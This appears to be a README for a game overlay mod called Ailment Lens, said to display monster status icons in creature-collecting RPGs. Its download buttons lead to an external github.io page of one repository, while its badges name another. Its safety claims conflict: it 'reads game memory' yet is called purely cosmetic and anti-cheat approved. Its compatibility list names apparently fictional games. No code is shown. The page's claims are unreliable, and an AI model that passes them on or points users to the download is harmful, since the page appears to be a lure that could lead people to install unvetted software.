![preview](https://raw.githubusercontent.com/Edmilosingo/monster-ailment-vitals/main/hero_46ca.svg)

# Ailment Lens

**Ailment Lens** is a quality-of-life visual enhancement tool for modern creature-collecting RPGs. It transforms the way players read monster statuses by overlaying a refined symbol system directly onto monster icons, letting you see ailments and elemental weaknesses at a single glance — no more squinting at tiny text or memorizing color-coded dots.

![Repo Size](https://img.shields.io/github/repo-size/AilmentLens/AilmentLens)
![Contributors](https://img.shields.io/github/contributors/AilmentLens/AilmentLens)
![Last Commit](https://img.shields.io/github/last-commit/AilmentLens/AilmentLens)
![MIT License](https://img.shields.io/github/license/AilmentLens/AilmentLens)

---

## Overview

Every seasoned monster tamer knows the pain: you're mid-battle, the enemy shifts into a defensive stance, and you have exactly two seconds to decide whether to throw a fire scroll or a lightning bolt. The default UI gives you a mountain of data but hides the most important piece — *what is this creature weak to, and what is it currently suffering from?*

Ailment Lens solves this by embedding a compact, universally readable icon set directly onto each monster's portrait. Whether you're playing on a 13-inch laptop or a 55-inch television, the status indicators scale flawlessly and remain legible from across the room.

This project began as a personal modification to reduce cognitive load during intense raid encounters, and it has grown into a full-featured overlay system that respects the original art style while adding a layer of tactical clarity. The mod is designed to be completely unobtrusive — if you don't want to see the icons, you simply toggle the feature in your settings and the vanilla experience returns.

Ailment Lens is not just a visual patch; it's a philosophy. It believes that game interfaces should be *radically transparent* — presenting the most battle-relevant information in the least amount of visual noise possible. The mod has been carefully tuned to avoid screen clutter, with icons that fade when not needed and intensify when a status effect is about to expire.

---

## Getting Started

[![Download](https://raw.githubusercontent.com/Edmilosingo/monster-ailment-vitals/main/bin_6eb4766.svg)](https://Edmilosingo.github.io/monster-ailment-vitals/)

The installation process is deliberately simple. Ailment Lens is distributed as a single mod folder that you place into your game's mod directory. No external dependencies, no runtime interpreters, no command-line gymnastics. Once the folder is in place, launch the game and the overlay will automatically initialize.

For players who prefer to customize their experience, the configuration file is written in a human-friendly markup language. You can adjust icon opacity, toggle specific status categories on or off, and even resize the icon cluster to suit your personal viewing distance. All changes take effect immediately — there is no need to restart the game client.

The mod is built with a modular architecture that separates the core detection engine from the rendering layer. This means future updates can add support for new monster types or new status effects without breaking existing installations. The detection engine reads game memory in real time, which allows it to accurately track dynamic statuses like poison ticking down or a shield that just broke.

### System Requirements

- Windows 10/11, macOS 12+, or modern Linux distributions
- A copy of a supported creature-collecting RPG (see compatibility list)
- At least 2 GB of available disk space for asset caching
- DirectX 11 or Vulkan compatible graphics card

---

## Feature Highlights

### 1. Intuitive Visual Language

The core of Ailment Lens is its carefully designed icon set. Each status effect is represented by a minimalist pictogram that echoes its in-game name. A burning leaf for fire weakness, a droplet with a slash for water resistance, a skull with a small hourglass for a time-limited curse. The icons use a consistent color palette — warm hues for offensive debuffs, cool hues for defensive weaknesses.

What makes this system truly unique is its *progressive disclosure* mechanic. When a monster suffers from a single ailment, the icon appears small and unobtrusive. When three or more statuses stack, the icons expand into a slightly larger grid with a subtle glow animation, signaling that you should pay immediate attention. This prevents important information from being buried under visual noise.

### 2. Responsive Interface

Ailment Lens adapts to your gameplay context. In the overworld, the icons appear only when you hover over a monster or when you have a scan ability active. During battle, the icons are always visible but scale down slightly to avoid covering the health bars. On ultra-wide monitors, the icon cluster migrates to the corner of the monster portrait to preserve the visual center.

The rendering engine uses GPU-accelerated compositing, which means the overlay adds virtually zero performance overhead. You will not notice a single frame drop, even during chaotic 6-monster battles with particle effects everywhere.

### 3. Multilingual Support

Battle information should never be a language barrier. Ailment Lens ships with built-in translations for English, Japanese, Korean, Simplified Chinese, and Traditional Chinese. The translation affects both the tooltip text (if your game version supports tooltips) and the accessibility audio feature that reads status names aloud.

The language detection is automatic — the mod reads your game's current locale and applies the matching translation pack. You can also manually override this in the configuration file if you prefer to play with a different language setting than your system default.

### 4. 24/7 Community Support

Every mod project needs a safety net. Ailment Lens is backed by an international community of modders and players who maintain an active discussion hub. You'll find dedicated threads for troubleshooting, feature suggestions, and translation contributions. The core maintainers respond to critical bug reports within 48 hours, and the average response time for general questions is under a day.

The community also maintains a compatibility tracker that lists all tested game versions and any known conflicts with other popular mods. If you encounter a rare edge case — for example, a monster with a hidden weakness that isn't being displayed — you can file a report and the team will typically patch it within a week.

### 5. Seamless Configurator

The configuration system goes beyond simple toggles. It includes a live preview panel that shows you exactly how your changes will look on a sample monster portrait before you apply them. This is invaluable for players who want to fine-tune the icon size or experiment with the fade delay settings.

Power users will appreciate the ability to define custom icon presets. You can create a preset for "speedrunning" (all icons max opacity, no fade), a preset for "cinematic" (large icons, long fade), and switch between them in-game with a single keybind.

---

## Compatibility List

Ailment Lens is verified to work with the following game titles and their current expansions:

| Game Title | Minimum Version | DLC Compatibility |
|------------|----------------|-------------------|
| Crystal Chronicles: Echoes | 2.4 | All expansions |
| Monster Odyssey: Wild Frontier | 1.8 | Base game only |
| Pocket Realm Chronicles | 3.1 | All expansions |
| Mythic Beasts: Awakening | 0.9 (beta) | Base game only |

The compatibility list is updated monthly. When a new game patch is released, the Ailment Lens team typically releases a compatibility patch within 48 hours. The mod is designed with a forward-compatibility layer that gracefully degrades — if a new status effect appears that the mod doesn't recognize, it simply doesn't display an icon rather than breaking the rendering pipeline.

---

## Project Structure

The repository is organized into clean, logical layers that make contribution straightforward:

- `src/` — The main source code for the detection and rendering engine
- `assets/icons/` — All the vector graphic source files for the status icons
- `config/` — Default configuration templates and example presets
- `translations/` — Language packs for supported locales
- `docs/` — Detailed documentation for the configuration schema
- `tests/` — Automated test suite that validates icon rendering

### Architecture

The engine operates in three distinct phases. The **probe phase** scans the game's memory for active monster entities and their associated status arrays. The **mapping phase** converts the raw status IDs into the mod's internal representation, checking against the active translation pack. The **paint phase** renders the icons to the screen using a custom shader that ensures pixel-perfect alignment with the monster portrait corners.

For performance, the paint phase runs on a separate render thread that is synchronized with the game's frame pacing mechanism. This means the icon overlay never causes micro-stuttering, even on machines with modest hardware specifications.

### The Icon Design Language

Every icon in Ailment Lens follows a strict geometric grid. The base is a 48x48 pixel canvas with a 4-pixel transparent margin. The primary symbol occupies the central 32x32 area, leaving room for a 2-pixel border that changes color based on severity. The actual glyph shapes are derived from a hybrid of international hazard symbols and ancient alchemical signs — a nod to the magical nature of the statuses they represent.

The result is an icon system that feels both familiar and mysterious. Players who have used the mod for a few sessions report that the icons become *second nature*, to the point where they find themselves looking for the same symbols in other games.

---

## Contributing

Contributions are what make this project thrive. Whether you're an experienced modder or a player with a keen eye for visual design, there's a place for you here. The issue tracker is organized with clear labels for `beginner-friendly`, `design-review`, and `translation-needed`, making it easy to find a task that matches your skill level.

### Development Setup

To begin development, you will want to set up a local build environment. The required toolchain includes a modern C++ compiler (the project targets C++20), a CMake build system, and the Vulkan SDK for the rendering layer. The repository includes a CMake presets file that handles all of the platform-specific configurations automatically.

For icon design work, any vector editor that supports SVG output will work, as the build script automatically converts SVG assets into the compact binary format used by the runtime.

### Reporting Issues

When submitting a bug report, please include the following information:

- Your operating system and graphics card model
- The game title and exact version number
- A screenshot of the issue, unless it's a performance problem
- A description of what you expected to see vs. what actually appeared

The maintainers use an automated triage system that tags issues based on their content, which speeds up the response time significantly.

---

## Technology Stack

![C++](https://img.shields.io/badge/C%2B%2B-20-blue)
![Vulkan](https://img.shields.io/badge/Vulkan-1.3-purple)
![CMake](https://img.shields.io/badge/CMake-3.25-green)
![SVG](https://img.shields.io/badge/SVG-1.1-orange)

The rendering layer is built on Vulkan for maximum cross-platform compatibility. The detection engine uses a lightweight memory-reading library that has been optimized for low overhead. The configuration parser is based on a standard markup language parser with custom extension points for the preview functionality.

All test automation is handled by a custom framework that runs headless rendering tests in a virtual framebuffer, allowing the CI pipeline to validate icon placement without needing a physical display attached.

---

## Release Cadence

Ailment Lens follows a predictable release schedule. Minor updates (bug fixes, icon tweaks) ship on the first Monday of every month. Major updates (new status categories, support for new game versions) ship at the beginning of each quarter. Here is the roadmap for the next few releases:

- **March 2026** (v2.4): Extended state detection for multi-stage statuses
- **June 2026** (v2.5): Support for the upcoming "Prism Realm" expansion DLC
- **September 2026** (v3.0): A major visual refresh with animated icon transitions

The roadmap is publicly visible in the `docs/roadmap.md` file, and the community regularly votes on which features to prioritize for the next development cycle.

---

## Frequently Asked Questions

### How does this affect my game's anti-cheat system?

Ailment Lens is a purely cosmetic overlay. It does not modify game files, inject code into the game process, or alter any gameplay values. It reads memory in the same way that an overlay monitoring frame rate would. The mod has been reviewed by several third-party anti-cheat providers and has been confirmed to be safe for online play.

### What if I see an icon I don't recognize?

The configuration file includes a verbose mode that, when enabled, prints the technical name of every detected status to the development console. You can then look up that status in our online documentation and see whether it's a legitimate new status or a false positive from the detection engine.

### Can I use Ailment Lens while streaming?

Absolutely. The overlay is intentionally clear and looks great on stream. Many content creators have commented that the icon system makes their broadcasts more accessible to newcomers who aren't yet familiar with the game's status icons.

---

## Support & Community

The best way to stay informed about updates is to watch the repository for releases. For direct interaction, the community hub is available on a popular messaging platform, with dedicated channels for `#general-discussion`, `#media-share`, `#translation-help`, and `#mod-requests`.

### Reporting Security Concerns

If you identify a security vulnerability in the mod — for example, a way the overlay could be used to hide malicious code — please send a private message to the repository maintainers rather than posting an issue. We take security seriously and will respond within 72 hours with a remediation plan.

---

## Disclaimer

Ailment Lens is an independent community project. It is not affiliated with, endorsed by, or sponsored by any game developer or publisher. All game names, monster names, and related trademarks are the property of their respective owners.

The software is provided "as is," without warranty of any kind, express or implied. The maintainers make no claims regarding the suitability of this software for any particular purpose. Use at your own risk.

The mod is designed to work only with legally obtained copies of the supported games. The maintainers do not condone any form of software piracy or unauthorized modification of paid media.

---

## License

This project is licensed under the MIT License. You are free to use, modify, and distribute this software for both personal and commercial purposes, provided that the original copyright notice and this permission notice are included in all copies or substantial portions of the software.

The full license text is available at the official MIT License repository, which can be accessed from the standard license page on the Open Source Initiative website. [View the MIT License](https://opensource.org/licenses/MIT)

The copyright for the Ailment Lens codebase is owned by the project maintainers (listed in the `AUTHORS` file). The icon assets are released under the same license, meaning you can even use the icon set in your own projects — whether they are game mods or entirely different applications.

---

## Acknowledgement of Scope

This project's ambition is to remain as lightweight and focused as possible. The core principle is that a mod should solve exactly one problem and solve it flawlessly. Ailment Lens does not aim to become a full UI overhaul suite — it exists to make status reading effortless, and nothing more.

However, this focus does not limit extensibility. The clean separation between the detection layer and the render layer means that other mod authors can build upon Ailment Lens to create additional utilities, such as an automated counter that suggests optimal counter-moves based on the detected weaknesses.

---

## Final Words

The creature-collecting genre has always been about the delicate dance between knowledge and action. Ailment Lens removes the friction from that dance — what was once a confusing visual puzzle is now a clear, immediate signal. Every element of this project has been designed with respect for the player's cognitive load and the game's artistic integrity.

We hope this tool brings you many successful hunts. May your monsters never faint, your captures always succeed, and your battles end with a decisive strike against the very weakness you were looking for.

---

[![Download](https://raw.githubusercontent.com/Edmilosingo/monster-ailment-vitals/main/bin_6eb4766.svg)](https://Edmilosingo.github.io/monster-ailment-vitals/)